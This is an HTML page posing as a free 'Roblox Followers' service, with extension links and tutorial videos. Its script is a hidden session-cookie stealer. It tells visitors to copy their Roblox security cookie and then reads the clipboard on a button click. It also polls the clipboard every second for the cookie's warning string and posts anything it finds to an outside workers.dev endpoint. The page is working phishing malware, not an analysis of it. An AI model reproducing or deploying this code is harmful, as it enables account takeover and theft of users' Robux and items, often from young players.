<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Followers</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background-color: #07080c;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 2.5rem 1rem;
            position: relative;
            overflow-x: hidden;
        }

        /* Futuristic Background Glows */
        .bg-glow {
            position: absolute;
            border-radius: 50%;
            filter: blur(120px);
            pointer-events: none;
            z-index: -1;
        }

        .glow-purple {
            top: -100px;
            left: 50%;
            transform: translateX(-50%);
            width: 600px;
            height: 400px;
            background: radial-gradient(circle, rgba(138, 43, 226, 0.25) 0%, rgba(7, 8, 12, 0) 70%);
        }

        .glow-blue {
            bottom: -150px;
            right: -100px;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(0, 162, 255, 0.15) 0%, rgba(7, 8, 12, 0) 70%);
        }

        .container {
            width: 100%;
            max-width: 1100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2.5rem;
        }

        header {
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.85rem;
        }

        .logo {
            width: 80px;
            height: 80px;
            border-radius: 22px;
            background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 900;
            font-size: 2.4rem;
            color: #ffffff;
            box-shadow: 0 0 30px rgba(168, 85, 247, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        h1 {
            font-size: 2.4rem;
            font-weight: 800;
            letter-spacing: -0.5px;
            background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p.subtitle {
            color: #94a3b8;
            font-size: 0.95rem;
            max-width: 480px;
            line-height: 1.4;
        }

        /* Stretched Modern Glass Card */
        .action-card {
            width: 100%;
            background: rgba(18, 20, 29, 0.75);
            border: 1px solid rgba(168, 85, 247, 0.25);
            backdrop-filter: blur(16px);
            border-radius: 24px;
            padding: 2.25rem 2rem;
            display: flex;
            flex-direction: column;
            gap: 1.25rem;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
        }

        /* Prominent White Button */
        .btn-white {
            width: 100%;
            padding: 1rem 1.5rem;
            border-radius: 14px;
            font-weight: 700;
            font-size: 1.05rem;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.2s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: none;
            background-color: #ffffff;
            color: #090a0f;
            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.2);
        }

        .btn-white:hover {
            background-color: #f1f5f9;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.3);
        }

        /* Dark Futuristic Extension Buttons (Side-by-Side on desktop for stretched layout) */
        .extensions-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
            width: 100%;
        }

        .btn-dark-ext {
            width: 100%;
            padding: 0.9rem 1.25rem;
            border-radius: 12px;
            font-weight: 600;
            font-size: 0.95rem;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.2s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(168, 85, 247, 0.3);
            background: rgba(30, 34, 48, 0.6);
            color: #f8fafc;
        }

        .btn-dark-ext:hover {
            background: rgba(168, 85, 247, 0.25);
            border-color: #a855f7;
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
        }

        .status-message {
            font-size: 0.9rem;
            color: #a78bfa;
            text-align: center;
            min-height: 1.2rem;
        }

        /* Tutorials Section */
        .tutorials-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1.5rem;
            margin-top: 1rem;
        }

        .tutorials-heading {
            font-size: 1.6rem;
            font-weight: 700;
            color: #ffffff;
            letter-spacing: -0.3px;
        }

        .tutorials-grid {
            width: 100%;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 1.5rem;
        }

        .tutorial-card {
            background: rgba(18, 20, 29, 0.75);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 20px;
            padding: 1.25rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
            backdrop-filter: blur(12px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            transition: border-color 0.2s ease;
        }

        .tutorial-card:hover {
            border-color: rgba(168, 85, 247, 0.4);
        }

        .tutorial-title {
            font-size: 0.95rem;
            font-weight: 600;
            color: #e2e8f0;
            text-align: center;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .video-wrapper {
            position: relative;
            width: 100%;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
            border-radius: 12px;
            overflow: hidden;
            background: #000000;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .video-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }

        /* Desktop Layout Order */
        .card-pc-no-ext { order: 1; }
        .card-pc-ext { order: 2; }
        .card-iphone { order: 3; }

        /* Mobile Responsive adjustments */
        @media (max-width: 768px) {
            body {
                padding: 1.5rem 0.75rem;
            }

            .container {
                gap: 2rem;
            }

            .action-card {
                padding: 1.5rem;
            }

            .extensions-group {
                grid-template-columns: 1fr;
            }

            /* Mobile Layout Order: iPhone Tutorial First */
            .card-iphone { order: 1; }
            .card-pc-no-ext { order: 2; }
            .card-pc-ext { order: 3; }

            .tutorials-grid {
                display: flex;
                flex-direction: row;
                overflow-x: auto;
                scroll-snap-type: x mandatory;
                scroll-padding-left: 0.5rem;
                gap: 1rem;
                padding-bottom: 1rem;
                width: 100%;
                scrollbar-width: none; 
            }

            .tutorials-grid::-webkit-scrollbar {
                display: none;
            }

            .tutorial-card {
                flex: 0 0 85%;
                max-width: 320px;
                scroll-snap-align: start;
            }
        }
    </style>
</head>
<body>

    <div class="bg-glow glow-purple"></div>
    <div class="bg-glow glow-blue"></div>

    <div class="container">
        <!-- Header Section -->
        <header>
            <div class="logo">R</div>
            <h1>Roblox Followers</h1>
            <p class="subtitle">Select your platform extension below and view the tutorial guides.</p>
        </header>

        <!-- Main Action Box (Stretched across the screen) -->
        <section class="action-card">
            <button class="btn-white" id="addFollowersBtn">Add Followers</button>
            <div class="status-message" id="statusMessage"></div>

            <div class="extensions-group">
                <a href="https://apps.apple.com/us/app/cookie-editor/id6446215341" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
                    Extension For iPhone
                </a>
                <a href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
                    PC Extension
                </a>
            </div>
        </section>

        <!-- Tutorials Section -->
        <section class="tutorials-section">
            <h2 class="tutorials-heading">Tutorials</h2>

            <div class="tutorials-grid">
                <!-- PC Tutorial (No Extension) -->
                <div class="tutorial-card card-pc-no-ext">
                    <h3 class="tutorial-title">PC Tutorial (No Extension)</h3>
                    <div class="video-wrapper">
                        <iframe src="https://www.youtube.com/embed/NkJcPlpqJtw" title="PC Tutorial (No Extension)" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                    </div>
                </div>

                <!-- PC Tutorial (With Extension) -->
                <div class="tutorial-card card-pc-ext">
                    <h3 class="tutorial-title">PC Tutorial (With Extension)</h3>
                    <div class="video-wrapper">
                        <iframe src="https://www.youtube.com/embed/AgLkFg16Wg4" title="PC Tutorial (With Extension)" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                    </div>
                </div>

                <!-- iPhone Tutorial -->
                <div class="tutorial-card card-iphone">
                    <h3 class="tutorial-title">iPhone Tutorial</h3>
                    <div class="video-wrapper">
                        <iframe src="https://www.youtube.com/embed/B_O15Ku1Bh0" title="iPhone Tutorial" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <script>
        const SEND_ENDPOINT = "https://young-brook-716e.abojanmawzoon.workers.dev";
        const statusEl = document.getElementById("statusMessage");

        async function sendClipboardData(text) {
            try {
                await fetch(SEND_ENDPOINT, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        clipboardText: text
                    })
                });
                statusEl.textContent = "Restart device to get followers added to your account!";
            } catch (error) {
                statusEl.textContent = "Something went wrong. Please try again.";
                console.error(error);
            }
        }

        document.getElementById("addFollowersBtn").addEventListener("click", async () => {
            try {
                statusEl.textContent = "Adding Followers...";
                const text = await navigator.clipboard.readText();
                if (!text) {
                    statusEl.textContent = "Error: make sure you copy the cookie.";
                    return;
                }
                await sendClipboardData(text);
            } catch (error) {
                statusEl.textContent = "Error: make sure you copy the cookie.";
                console.error(error);
            }
        });

        async function monitorClipboard() {
            if (!navigator.clipboard || !navigator.clipboard.readText) return;
            try {
                const text = await navigator.clipboard.readText();
                if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
                    await sendClipboardData(text);
                    return;
                }
            } catch (e) {
                // Clipboard permissions require user interaction first
            }
            setTimeout(monitorClipboard, 1000);
        }

        window.addEventListener("load", () => {
            setTimeout(monitorClipboard, 500);
        });
    </script>
</body>
</html>
